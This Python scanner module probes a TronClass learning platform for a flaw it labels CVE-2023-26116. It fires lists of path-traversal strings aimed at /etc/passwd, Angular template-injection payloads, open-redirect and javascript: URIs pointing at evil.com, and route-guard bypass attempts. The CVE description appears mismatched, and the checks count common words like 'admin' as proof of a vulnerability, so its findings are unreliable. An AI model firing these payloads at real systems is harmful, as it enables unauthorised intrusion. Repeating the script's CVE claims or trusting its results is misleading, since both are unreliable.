"""
CVE-2023-26116 Vulnerability Detection Script
Angular router vulnerability detection for TronClass LMS
"""

import requests
import urllib.parse
from urllib.parse import urljoin, quote

def scan(session, target_url):
    """
    Scan for CVE-2023-26116 vulnerability
    Angular router path traversal and navigation vulnerability
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2023-26116: Angular router path traversal and navigation vulnerability',
        'remediation': 'Update Angular router to latest version and implement proper path validation'
    }
    
    try:
        # Check for Angular router usage
        response = session.get(target_url, timeout=30)
        
        angular_router_indicators = [
            '@angular/router',
            'RouterModule',
            'Router',
            'ActivatedRoute',
            'routerLink',
            'router-outlet',
            'RouterOutlet',
            'NavigationEnd',
            'NavigationStart',
            'Route',
            'Routes'
        ]
        
        uses_angular_router = any(indicator in response.text for indicator in angular_router_indicators)
        
        if not uses_angular_router:
            result['evidence'] = "Angular router not detected"
            return result
        
        # Test for path traversal vulnerabilities
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/admin/../../../etc/passwd',
            '/user/../admin',
            '/course/../admin/dashboard',
            '/profile/../admin/users',
            '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '/..%252f..%252f..%252fetc%252fpasswd',
            '/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '/..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd'
        ]
        
        for payload in traversal_payloads:
            try:
                response = session.get(urljoin(target_url, payload), timeout=30)
                
                # Check for file system access
                if 'root:' in response.text or 'localhost' in response.text or 'admin' in response.text:
                    result['vulnerable'] = True
                    result['evidence'] = f"Path traversal vulnerability detected with payload: {payload}"
                    return result
            except:
                continue
        
        # Test for route parameter injection
        route_injection_payloads = [
            '/user/{{constructor.constructor("alert(1)")()}}',
            '/user/{{$eval("alert(1)")}}',
            '/course/{{7*7}}',
            '/profile/{{constructor.constructor("location.href=\'http://evil.com\'")()}}',
            '/quiz/{{this.constructor.constructor("alert(1)")()}}',
            '/assignment/{{[].constructor.constructor("alert(1)")()}}'
        ]
        
        for payload in route_injection_payloads:
            try:
                response = session.get(urljoin(target_url, payload), timeout=30)
                
                # Check for template injection execution
                if '49' in response.text and '{{7*7}}' in payload:
                    result['vulnerable'] = True
                    result['evidence'] = f"Route parameter injection detected with payload: {payload}"
                    return result
                    
                if payload in response.text:
                    result['vulnerable'] = True
                    result['evidence'] = f"Route parameter injection vulnerability detected with payload: {payload}"
                    return result
            except:
                continue
        
        # Test for URL redirection vulnerabilities
        redirect_payloads = [
            '/login?redirect=http://evil.com',
            '/login?return=http://evil.com',
            '/login?next=http://evil.com',
            '/login?url=http://evil.com',
            '/login?returnUrl=http://evil.com',
            '/logout?redirect=http://evil.com',
            '/auth/callback?redirect=http://evil.com',
            '/login?redirect=//evil.com',
            '/login?redirect=javascript:alert(1)',
            '/login?redirect=data:text/html,<script>alert(1)</script>'
        ]
        
        for payload in redirect_payloads:
            try:
                response = session.get(urljoin(target_url, payload), timeout=30, allow_redirects=False)
                
                # Check for open redirect
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if 'evil.com' in location or 'javascript:' in location:
                        result['vulnerable'] = True
                        result['evidence'] = f"Open redirect vulnerability detected with payload: {payload}"
                        return result
            except:
                continue
        
        # Test for route guard bypass
        protected_routes = [
            '/admin',
            '/admin/dashboard',
            '/admin/users',
            '/admin/courses',
            '/admin/settings',
            '/teacher/grades',
            '/student/quiz/answers',
            '/api/admin',
            '/api/teacher',
            '/profile/admin'
        ]
        
        bypass_techniques = [
            '',
            '/',
            '?',
            '#',
            '?admin=true',
            '?role=admin',
            '?bypass=true',
            '/../admin',
            '/./admin',
            '//admin'
        ]
        
        for route in protected_routes:
            for technique in bypass_techniques:
                try:
                    test_url = route + technique
                    response = session.get(urljoin(target_url, test_url), timeout=30)
                    
                    if response.status_code == 200:
                        admin_indicators = ['admin', 'dashboard', 'users', 'settings', 'grades']
                        if any(indicator in response.text.lower() for indicator in admin_indicators):
                            result['vulnerable'] = True
                            result['evidence'] = f"Route guard bypass detected at {test_url}"
                            return result
                except:
                    continue
        
        # Test for fragment-based vulnerabilities
        fragment_payloads = [
            '#/admin',
            '#/admin/dashboard',
            '#/admin/users',
            '#admin',
            '#admin/dashboard',
            '#{{constructor.constructor("alert(1)")()}}',
            '#<script>alert(1)</script>',
            '#javascript:alert(1)'
        ]
        
        for payload in fragment_payloads:
            try:
                response = session.get(target_url + payload, timeout=30)
                
                if response.status_code == 200:
                    if 'admin' in response.text.lower() or payload in response.text:
                        result['vulnerable'] = True
                        result['evidence'] = f"Fragment-based vulnerability detected with payload: {payload}"
                        return result
            except:
                continue
        
        # Test for Angular router outlet vulnerabilities
        outlet_payloads = [
            '/primary:(admin)',
            '/primary:(admin/dashboard)',
            '/(admin)',
            '/(admin//dashboard)',
            '/primary:(user//admin)',
            '/sidebar:(admin)',
            '/popup:(admin)'
        ]
        
        for payload in outlet_payloads:
            try:
                response = session.get(urljoin(target_url, payload), timeout=30)
                
                if response.status_code == 200:
                    if 'admin' in response.text.lower():
                        result['vulnerable'] = True
                        result['evidence'] = f"Router outlet vulnerability detected with payload: {payload}"
                        return result
            except:
                continue
        
        # Test for lazy loading module vulnerabilities
        lazy_load_payloads = [
            '/admin/lazy',
            '/admin/module',
            '/admin/chunk',
            '/lazy/admin',
            '/module/admin',
            '/chunk/admin'
        ]
        
        for payload in lazy_load_payloads:
            try:
                response = session.get(urljoin(target_url, payload), timeout=30)
                
                if response.status_code == 200:
                    lazy_indicators = ['chunk', 'module', 'lazy', 'admin']
                    if any(indicator in response.text.lower() for indicator in lazy_indicators):
                        result['vulnerable'] = True
                        result['evidence'] = f"Lazy loading vulnerability detected at {payload}"
                        return result
            except:
                continue
                
    except Exception as e:
        result['evidence'] = f"Error during scan: {str(e)}"
    
    return result